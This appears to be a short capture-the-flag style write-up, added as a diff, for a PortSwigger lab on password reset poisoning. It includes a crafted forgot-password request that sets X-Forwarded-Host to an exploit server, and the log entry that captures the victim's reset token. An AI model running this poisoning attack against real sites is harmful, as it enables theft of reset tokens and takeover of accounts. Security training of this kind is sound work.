@@ -1,0 +1,12 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
+
+Intercept a request to change the password for Carlos, and use the param miner extension in BurpSuit to find the header "X-Forwrded-Host".
+Add the X-Forwarded-Host header with the exploit server as a value.
+
+POST /forgot-password HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+X-Forwarded-Host: [SUB_DOMAIN].exploit-server.net
+
+After sending the request and monitoring the taffic to the exploit server, the following entry will be found in the log:
+"GET /forgot-password?temp-forgot-password-token=[TOKEN] HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
